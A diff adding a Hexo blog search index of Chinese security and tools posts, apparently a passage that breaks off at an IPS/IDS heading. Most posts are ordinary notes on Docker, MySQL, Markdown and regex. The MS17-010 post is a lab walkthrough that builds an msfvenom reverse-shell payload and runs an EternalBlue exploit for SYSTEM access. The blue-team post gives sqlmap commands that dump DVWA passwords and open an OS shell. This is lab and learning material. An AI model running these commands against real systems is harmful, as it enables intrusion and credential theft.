@@ -1,0 +1,1667 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>docker 常用命令</title>
+    <url>/2020/07/20/%E5%B7%A5%E5%85%B7/docker/</url>
+    <content><![CDATA[<h2 id="docker"><a class="header-anchor" href="#docker"></a>docker</h2>
+<p>从镜像启动容器</p>
+<p>-d: 后台运行</p>
+<p>-p: 端口映射，宿主机的2020端口映射到容器的80端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 2020:80 &#123;image&#125;</span><br></pre></td></tr></table></figure>
+<p>显示所有容器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker container ls --all</span><br></pre></td></tr></table></figure>
+<p>启动/停止/重启/删除容器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker start&#x2F;stop&#x2F;restart&#x2F;rm 容器名或容器ID</span><br></pre></td></tr></table></figure>
+<p>重命名容器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rename 原名 新名</span><br></pre></td></tr></table></figure>
+<p>进入容器内部</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it &#123;容器ID&#125; bash</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mysql的自动类型转换</title>
+    <url>/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/</url>
+    <content><![CDATA[<h2 id="一个小特性"><a class="header-anchor" href="#一个小特性"></a>一个小特性</h2>
+<p>在查询语句的条件判断子句中，如果等号左右两边的类型不同，则会自动进行类型转换。以如下数据表为例</p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084058433.png" alt="image-20200722084058433"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082629984.png" alt="image-20200722082629984"></p>
+<p><code>DVWA</code>的<code>user</code>表👆</p>
+<p>在进行以下查询时结果如图：</p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082807883.png" alt="image-20200722082807883"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082829117.png" alt="image-20200722082829117"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084904218.png" alt="image-20200722084904218"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084727031.png" alt="image-20200722084727031"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722083932481.png" alt="image-20200722083932481"></p>
+<p>通过上面几个查询的例子可以看到，mysql查询语句的条件判断中，像user_id = ‘xxx’ 这种条件，user_id 是整型，而 ‘xxx’ 是字符串型，在判断时，'xxx’会被当作一个整型与 user_id进行比较。</p>
+<p>而转换的规则也很有意思。</p>
+<p>‘1 and 1=1’ 被当作 1</p>
+<p>‘1 and 1=2’ 也被当作1</p>
+<p>‘2 and 1=1’ 被当作2</p>
+<p>经过更多的测试可以发现</p>
+<p>这个字符串（不论是单引号或者是双引号）在被当作整型数进行处理的时候</p>
+<p>如果第一个字符不是数字，那么该字符串被当成<code>0</code>来处理；</p>
+<p>如果第一个字符是数字，那么这个字符串就等于从第一个字符开始的数字串</p>
+<p>比如：‘4gsb’ = 4；‘108hh’ = 108</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>mysql</category>
+      </categories>
+      <tags>
+        <tag>mysql</tag>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在Markdown中使用emoji表情</title>
+    <url>/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/</url>
+    <content><![CDATA[<h2 id="emoji表情大全"><a class="header-anchor" href="#emoji表情大全"></a>emoji表情大全</h2>
+<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/u8SbATtdLwU5VjB.png" alt></p>
+<p>理想情况下，在Markdown编辑器中输入如上图所示的语句后将显示对应的emoji表情。但是否显示则取决于你的markdown解析器。</p>
+<h2 id="hexo博客使用emoji"><a class="header-anchor" href="#hexo博客使用emoji"></a>hexo博客使用emoji</h2>
+<p><strong>hexo</strong> 框架默认的markdown解析器是<code>hexo-renderer-marked</code>，并不支持emoji表情的解析。所以如果想要在博客文章里添加emoji表情😮，可以考虑使用<code>hexo-renderer-markdown-it</code> 解析器。</p>
+<p>首先打开Node.js的命令行并移动到你的博客根目录下</p>
+<p><img src="/2020/04/07/%E5%B7%A5%E5%85%B7/%E5%9C%A8Markdown%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/jQKAbRWvhGMDFgx.png" alt></p>
+<p>卸载原有的<code>hexo-renderer-marked</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm un hexo-renderer-marked -S</span><br></pre></td></tr></table></figure>
+<p>再安装<code>hexo-renderer-markdown-it</code> ：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-markdown-it -S</span><br></pre></td></tr></table></figure>
+<p>完成之后安装所需的插件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i markdown-it-emoji -S</span><br></pre></td></tr></table></figure>
+<p>最后打开根目录下的<code>_config.yml</code>文件，添加以下配置：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">markdown:</span><br><span class="line">  render:</span><br><span class="line">    html: true # 在 markdown 文本中支持 html tag 标签</span><br><span class="line">    xhtmlOut: false # 需要 xtml 文档，使用 &lt;br &#x2F;&gt; 替代 &lt;br&gt;</span><br><span class="line">    breaks: true # 用 &lt;br&gt; 开始新的一行</span><br><span class="line">    linkify: true # 自动将 可能是链接的内容转换成链接</span><br><span class="line">    typographer: true # 印刷标识转换</span><br><span class="line">  plugins:</span><br><span class="line">    - markdown-it-emoji # emoji表情插件</span><br><span class="line">    - markdown-it-abbr # 可选</span><br><span class="line">    - markdown-it-footnote # 可选</span><br><span class="line">    - markdown-it-ins # 可选，</span><br><span class="line">    - markdown-it-sub # 可选，下标，如H2O</span><br><span class="line">    - markdown-it-sup # 可选，上标，如2^10</span><br><span class="line">  anchors:</span><br><span class="line">    level: 2</span><br><span class="line">    collisionSuffix: &#39;&#39;</span><br><span class="line">    permalink: false,</span><br><span class="line">    permalinkClass: &#39;header-anchor&#39;</span><br><span class="line">    permalinkSymbol: &#39;&#39;</span><br><span class="line">    case: 0</span><br><span class="line">    separator: &#39;&#39;</span><br></pre></td></tr></table></figure>
+<p>然后保存退出，再重新加载一下hexo即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
+<p>参考来源： <a href="https://zucchiniy.cn/archives/953e2b.html">ZucchinY的博客</a></p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Markdown</category>
+      </categories>
+      <tags>
+        <tag>Markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则表达式学习笔记（留坑待填）</title>
+    <url>/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="简介"><a class="header-anchor" href="#简介"></a>简介</h2>
+<blockquote>
+<p>正则表达式是描述一组字符串特征的模式，用来匹配特定的字符串。 ——Ken Thompson</p>
+</blockquote>
+<p>一个正则表达式是一串特殊的字符串，它可以用于匹配一组字符串。比如</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\d</span><br></pre></td></tr></table></figure>
+<p>就是一个简单的正则表达式，它可以用来匹配0~9范围内的任意<strong>一个数字</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^(\(\d&#123;3&#125;\)|^\d&#123;3&#125;[.-]?)?\d&#123;3&#125;[.-]?\d&#123;4&#125;$</span><br></pre></td></tr></table></figure>
+<p>而上面这个式子也是一个正则表达式，只不过复杂了一些，它可以匹配10位的北美电话号码。无论区号是否加括号，数字间是否有句点或连字符，它都可以匹配。</p>
+<p><strong>学习时用到的工具</strong>：</p>
+<p><a href="http://www.regexpal.com">Regexpal网站</a>：可以在线测试正则表达式</p>
+<p>…</p>
+<h2 id="基础"><a class="header-anchor" href="#基础"></a>基础</h2>
+<h3 id="字符的匹配"><a class="header-anchor" href="#字符的匹配"></a>字符的匹配</h3>
+<h4 id="字面值匹配"><a class="header-anchor" href="#字面值匹配"></a>字面值匹配</h4>
+<p>最简单的一种，比如一个数字字符串<code>666</code>，可以在目标文本中匹配所有的<code>666</code></p>
+<p><img src="/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/fN1TQqSlujEPBCy.png" alt></p>
+<h4 id="字符组匹配"><a class="header-anchor" href="#字符组匹配"></a>字符组匹配</h4>
+<p>正则表达式将方括号<code>[]</code>视为特殊的元字符，因此方括号本身不参与匹配，而对括号内容进行匹配。</p>
+<p><code>[0-9]</code>这个正则表达式将会匹配0到9范围内的任意数字。要匹配任意3位数字可以用如下正则表达式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[0-9][0-9][0-9]</span><br></pre></td></tr></table></figure>
+<h4 id="字符组简写式（元字符）"><a class="header-anchor" href="#字符组简写式（元字符）"></a>字符组简写式（元字符）</h4>
+<p>例如：<code>[0-9]</code>可以简写为<code>\d</code>，它们都能匹配0到9之间的任意一个数字。</p>
+<p>空白字符：</p>
+<p><code>\f</code>：换页符</p>
+<p><code>\n</code>：换行符</p>
+<p><code>\r</code>：回车符</p>
+<p><code>\t</code>：制表符（Tab的缩进）</p>
+<p><code>\v</code>：垂直制表符</p>
+<p><code>\s</code>：任意一个空白字符，等价于 [\f\n\r\t\v]</p>
+<p><code>\S</code>：对<code>\s</code>取非，即任意非空字符</p>
+<p>数字元字符：</p>
+<p><code>\d</code>：匹配任意阿拉伯数字</p>
+<p><code>\D</code>：匹配任意非数字字符（如连字符<code>-</code>)</p>
+<p>字母数字元字符：</p>
+<p><code>\w</code>：大小写字母，下划线和数字，等价于[a-zA-Z0-9]</p>
+<p><code>\W</code>：对<code>\w</code>取非</p>
+<h4 id="任意字符的匹配"><a class="header-anchor" href="#任意字符的匹配"></a>任意字符的匹配</h4>
+<p><code>.</code>：点号（英文句号）可以匹配任意字符（但一般不匹配换行符）。</p>
+<p><code>.</code>是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上<code> \</code> 。</p>
+<h3 id="捕获分组和后向引用"><a class="header-anchor" href="#捕获分组和后向引用"></a>捕获分组和后向引用</h3>
+<p>将<code>\d</code>放到<code>()</code>中，则<code>\d</code>匹配到一个数字的同时该数字被捕获。捕获之后则可以被后向引用。</p>
+<p><code>\1</code>后向引用被捕获的字符。</p>
+<p>例如：正则表达式 <code>(\d)\d\1</code>  可以匹配 <code>101</code> 或者 <code>212</code> , <code>383</code> 等等,但无法匹配 <code>102</code> 。因为<code>\1</code>引用的是那个被捕获的字符，所以这个正则表达式匹配到的一定是某三个相连数字，其中第一个数字和第三个数字一定是相同的。</p>
+<h3 id="量词"><a class="header-anchor" href="#量词"></a>量词</h3>
+<p><code>\d{3}</code>匹配三个相连数字，这里<code>{3}</code>就是一个量词，花括号中可以有多个数字（用逗号<code>,</code>隔开）比如<code>{3,4}</code>表示3个或者4个；</p>
+<p><code>\d-?</code>匹配一个数字，如果该数字之后跟着一个连字符那么连字符也会被匹配到。这里的<code>?</code>也是一个量词，表示0个或1个；</p>
+<p>同理，其他常用的量词还有</p>
+<p><code>+</code>：表示1个或者多个</p>
+<p><code>*</code>：表示0个或者多个</p>
+<h3 id="括选文字符"><a class="header-anchor" href="#括选文字符"></a>括选文字符</h3>
+<p>现在可以看看下面这个比较健壮的表达式了，就是简介中的那个，它匹配10位的北美电话号码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^(\(\d&#123;3&#125;\)|^\d&#123;3&#125;[.-]?)?\d&#123;3&#125;[.-]?\d&#123;4&#125;$</span><br></pre></td></tr></table></figure>
+<p><code>^</code>匹配行起始位置，即<code>^</code>后面跟着的内容<code>(\(\d{3}\)|^\d{3}[.-]?)</code>必须出现在行首；</p>
+<p><code>\(</code>和<code>\)</code>就是将左右括号转义，让它表示其字面意思，而不是捕获分组的开始结束标志；</p>
+<p><code>|</code>表示或运算，即匹配<code>|</code>两边的内容之一；</p>
+<p><code>[.-]</code>匹配一个可选的点号（这里点号不再匹配任意字符）或连字符；</p>
+<p><code>$</code>匹配行的结束标志</p>
+<p>这个表达式最终匹配十位的北美电话号码，而且括号、连字符或者点号都是可选的。你可以试试不同格式的电话号码，看看它能否匹配。以上正则表达式中的捕获分组并不是必需的。分组是必要的，但是捕获不需要。更好的方法是使用非捕获分组。</p>
+<h2 id="模式匹配"><a class="header-anchor" href="#模式匹配"></a>模式匹配</h2>
+<p>留坑待填</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>正则表达式</category>
+      </categories>
+      <tags>
+        <tag>正则表达式</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MS17-010漏洞复现</title>
+    <url>/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="复现环境"><a class="header-anchor" href="#复现环境"></a>复现环境</h2>
+<p>靶机：Windows server 2012 R2 standard	(192.168.233.129)</p>
+<p>攻击机：Kali Linux	(192.168.233.128)</p>
+<h2 id="步骤"><a class="header-anchor" href="#步骤"></a>步骤</h2>
+<h3 id="环境配置"><a class="header-anchor" href="#环境配置"></a>环境配置</h3>
+<p>关闭靶机防火墙</p>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201425575.png" alt="image-20200718201425575"></p>
+<p>在window server 2012中启动Guest账号</p>
+<p>开始菜单 -&gt; 管理工具 -&gt; 本地安全策略</p>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201705610.png" alt="image-20200718201705610"></p>
+<h3 id="攻击"><a class="header-anchor" href="#攻击"></a>攻击</h3>
+<p>漏洞利用工具：<a href="https://github.com/vivami/MS17-010">https://github.com/vivami/MS17-010</a></p>
+<p>本次复现用到了 <code>eternalblue_kshellcode_x64.asm</code> 、<code>eternalblue_exploit8.py</code></p>
+<p>下载到kali后后使用NASM工具对asm代码编译</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nasm -f bin eternalblue_kshellcode_x64.asm</span><br></pre></td></tr></table></figure>
+<p>然后利用<code>msfvenom</code>工具生成payload，用于反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp -f raw -o reverse_shell.bin EXITFUNC&#x3D;thread LHOST&#x3D;192.168.233.128 LPORT&#x3D;9090</span><br></pre></td></tr></table></figure>
+<p>将 <code>kernel shellcode</code>和 <code>userland shellcode</code> 拼接为<code>metasploit_msf.bin</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat eternalblue_x64_kshellcode reverse_shell.bin &gt; metasploit_msf.bin</span><br></pre></td></tr></table></figure>
+<p>在新终端启动<code>metasploit</code> 并输入一下命令以监听反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set PAYLOAD windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.233.128</span><br><span class="line">set LPORT 9090</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205527473.png" alt="image-20200718205527473"></p>
+<p>回到原终端，修改<code>eternalblue_exploit8.py</code></p>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205908133.png" alt="image-20200718205908133"></p>
+<p>保存退出，然后运行该脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python eternalblue_exploit8.py 192.168.233.129 metasploit_msf.bin 500</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210137709.png" alt="image-20200718210137709"></p>
+<p>运行成功，此时返回msf命令行</p>
+<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210508820.png" alt="image-20200718210508820"></p>
+<p>可以看到，已成功连接到靶机，并获得了system权限。</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蓝队基础</title>
+    <url>/2021/03/04/%E6%9D%82%E8%AE%B0/%E8%93%9D%E9%98%9F%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h2 id="基础知识"><a class="header-anchor" href="#基础知识"></a>基础知识</h2>
+<h3 id="漏洞原理"><a class="header-anchor" href="#漏洞原理"></a>漏洞原理</h3>
+<h4 id="XSS"><a class="header-anchor" href="#XSS"></a>XSS</h4>
+<ul>
+<li>
+<p>原理</p>
+<p>应用程序或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分</p>
+</li>
+<li>
+<p>危害</p>
+<p>一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的HTML和JavaScript。攻击者可以获取受害者的cookie等</p>
+<p>JavaScript脚本可以跨域访问，<code>&lt;script&gt;</code>标签可以请求外部的js脚本，并且外部js脚本请求来之后是被认为与被攻击服务器同源的，所以可以访问当前服务器的cookie，所以反射型XSS的利用方式：构造恶意链接，将请求恶意js脚本的<code>&lt;script&gt;</code>作为参数传给服务器，在我们的恶意js脚本中可以使用加载图片的方式，将cookie作为参数传给我们的接收服务器</p>
+</li>
+</ul>
+<p>获取cookie：<a href="https://blog.csdn.net/l31299/article/details/72792613">https://blog.csdn.net/l31299/article/details/72792613</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.cookie</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>三种类型比较</p>
+<p>反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
+<p>客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和转义，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</p>
+<p>存储型XSS攻击即攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
+</li>
+<li>
+<p>防御方法</p>
+<p>过滤输入和转义处理</p>
+<p>第一、在输入方面对所有用户提交内容进行输入验证，提交内容包括URL、查询关键字、http头、post数据等</p>
+<p>第二、在输出方面，使用<code>htmlentities()</code>函数进行转义标签内的内容不会解释，直接显示。</p>
+</li>
+</ul>
+<h4 id="CSRF"><a class="header-anchor" href="#CSRF"></a>CSRF</h4>
+<ul>
+<li>
+<p>防御方法</p>
+<p>检查referer：敏感操作来源不能为本站点之外</p>
+<p>设置token：用以检查请求来自当前页面</p>
+</li>
+</ul>
+<h4 id="SSRF"><a class="header-anchor" href="#SSRF"></a>SSRF</h4>
+<ul>
+<li>
+<p>XXE漏洞</p>
+<p>SSRF（服务器端请求伪造）是一种攻击模式</p>
+<p>XXE（XML External Entity XML外部实体）则是一种攻击手法</p>
+<p>XXE漏洞利用了SSRF，让服务器向其他服务器应用请求XML外部实体（DTD文件）。</p>
+</li>
+<li>
+<p>RFI</p>
+<p>RFI（远程文件包含）也是SSRF的一种形式。</p>
+</li>
+</ul>
+<h4 id="SQLI"><a class="header-anchor" href="#SQLI"></a>SQLI</h4>
+<p>报错注入函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">floor()</span><br><span class="line">extractvalue()</span><br><span class="line">updatexml()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+<h3 id="端口号"><a class="header-anchor" href="#端口号"></a>端口号</h3>
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>对应服务</th>
+<th>端口号</th>
+<th>对应服务</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21</td>
+<td>ftp</td>
+<td>2601 2604</td>
+<td>zebra路由</td>
+</tr>
+<tr>
+<td>22</td>
+<td>ssh</td>
+<td>3306</td>
+<td>MySQL</td>
+</tr>
+<tr>
+<td>23</td>
+<td>telnet</td>
+<td>3312</td>
+<td>kangle主机管理系统</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>3389</td>
+<td>远程桌面</td>
+</tr>
+<tr>
+<td>80-89</td>
+<td>web</td>
+<td>4440</td>
+<td>rundeck</td>
+</tr>
+<tr>
+<td>161</td>
+<td>snmp</td>
+<td>5432</td>
+<td>PostgreSQL</td>
+</tr>
+<tr>
+<td>389</td>
+<td>LDAP</td>
+<td>5900</td>
+<td>vnc</td>
+</tr>
+<tr>
+<td>443</td>
+<td>https（心脏滴血）</td>
+<td>6379</td>
+<td>redis未授权</td>
+</tr>
+<tr>
+<td>445</td>
+<td>SMB（永恒之蓝）</td>
+<td>7001 7002</td>
+<td>WebLogic默认弱口令，反序列</td>
+</tr>
+<tr>
+<td>512 513 514</td>
+<td>Rexec</td>
+<td>8080</td>
+<td>tomcat</td>
+</tr>
+<tr>
+<td>873</td>
+<td>Rsync未授权</td>
+<td>8080 8089 9090</td>
+<td>JBOSS</td>
+</tr>
+<tr>
+<td>1025</td>
+<td>NFS</td>
+<td>8161</td>
+<td>activemq未授权访问</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>MSSQL</td>
+<td>27017 27018</td>
+<td>Mongodb未授权访问</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>Oracle</td>
+<td>50000</td>
+<td>SAP命令执行</td>
+</tr>
+</tbody>
+</table>
+<h2 id="安全工具"><a class="header-anchor" href="#安全工具"></a>安全工具</h2>
+<h3 id="扫描工具"><a class="header-anchor" href="#扫描工具"></a>扫描工具</h3>
+<ul>
+<li>
+<p>AWVS</p>
+</li>
+<li>
+<p>NESSUS</p>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">启动nessus</span></span><br><span class="line">service nessusd start</span><br><span class="line">firefox https://localhost:8834</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">找回用户名密码</span></span><br><span class="line">cd /opt/nessus/sbin/</span><br><span class="line">./nessuscli lsuser</span><br><span class="line">./nessuscli chpasswd [username]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>nmap</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;扫描C段</span><br><span class="line">nmap 192.168.233.1&#x2F;24</span><br><span class="line">&#x2F;&#x2F;根据IP地址范围扫描</span><br><span class="line">nmap 192.168.1-10.128-140</span><br><span class="line">&#x2F;&#x2F;扫描多个目标</span><br><span class="line">nmap 192,168.233.1 192.168.23.128</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;参数</span><br><span class="line">-p(小写)	指定端口</span><br><span class="line">-O、-A	探测操作系统</span><br><span class="line">-T	超时时间</span><br></pre></td></tr></table></figure>
+<ul>
+<li>sqlmap</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;......&quot; -p 可变的参数（如id等） --cookie &quot;......&quot; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;当前用户 --current-user</span><br><span class="line">&#x2F;&#x2F;当前数据库 --current-db</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; --current-user --current-db</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;-D指定数据库 然后--tables查询表</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; --tables</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;-D -T指定数据库和表 然后--columns查询列</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; -T &quot;users&quot; --columns</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;-C指定列然后--dump出结果</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; -T &quot;users&quot; -C &quot;user,password&quot; --dump</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;get WebShell</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;DVWA-1.9&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; -p &quot;id&quot; --cookie &quot;security&#x3D;low;PHPSESSID&#x3D;ke78jnt9j7mts8te23v69u4nh4&quot; -D &quot;dvwa&quot; -T &quot;users&quot; -C &quot;user,password&quot; --os-shell</span><br></pre></td></tr></table></figure>
+<h2 id="安全设备"><a class="header-anchor" href="#安全设备"></a>安全设备</h2>
+<h3 id="WAF"><a class="header-anchor" href="#WAF"></a>WAF</h3>
+<ul>
+<li>本地WAF
+<ul>
+<li>modSecurity
+<ul>
+<li>作为nginx的模块，需要编译安装</li>
+</ul>
+</li>
+<li>…</li>
+</ul>
+</li>
+<li>云WAF
+<ul>
+<li>无需用户更新</li>
+<li>成本低</li>
+<li>可能被绕过（网站的真实IP被获取</li>
+<li>阿里云WAF…</li>
+</ul>
+</li>
+<li>部署方式
+<ul>
+<li>反向代理
+<ul>
+<li>正向代理隐藏真实客户端，反向代理隐藏真实服务端</li>
+</ul>
+</li>
+<li>步骤
+<ul>
+<li>购买阿里云WAF产品</li>
+<li>在阿里云WAF中添加域名</li>
+<li>在服务器中设置防火墙放行来自WAF的流量</li>
+<li>在拥有域名的DNS服务商处修改DNS解析</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="蜜罐"><a class="header-anchor" href="#蜜罐"></a>蜜罐</h3>
+<p>Github 开源蜜罐 —— HFish</p>
+<p>安装包https://github.com/hacklcx/HFish/releases</p>
+<p>安装成功后启动服务即可</p>
+<p>蜜罐的作用</p>
+<ul>
+<li>获取攻击者IP、攻击过程等信息</li>
+<li>溯源取证（jsonp获取攻击者cookie…</li>
+</ul>
+<h3 id="态势感知平台"><a class="header-anchor" href="#态势感知平台"></a>态势感知平台</h3>
+<p>多种防护系统、流量监测系统的接入整合及可视化，监控全局流量，攻击事件报警等</p>
+<h3 id="IPS-IDS"><a class="header-anchor" href="#IPS-IDS"></a>IPS/IDS</h3>
